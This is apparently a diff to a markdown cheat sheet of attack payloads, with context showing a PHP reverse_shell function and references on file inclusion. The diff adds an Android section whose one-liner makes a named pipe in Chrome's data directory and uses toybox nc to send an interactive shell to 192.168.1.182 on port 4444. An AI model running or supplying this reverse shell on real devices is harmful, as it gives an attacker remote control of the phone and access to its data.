@@ -151,7 +151,10 @@ function reverse_shell() {
 }
 ?>
 ```
-
+Android:
+```
+mkfifo /data/data/com.android.chrome/files/a; toybox nc 192.168.1.182 4444 0</data/data/com.android.chrome/files/a | sh -i &>/data/data/com.android.chrome/files/a;
+```
 **References:**
 
 LFI:
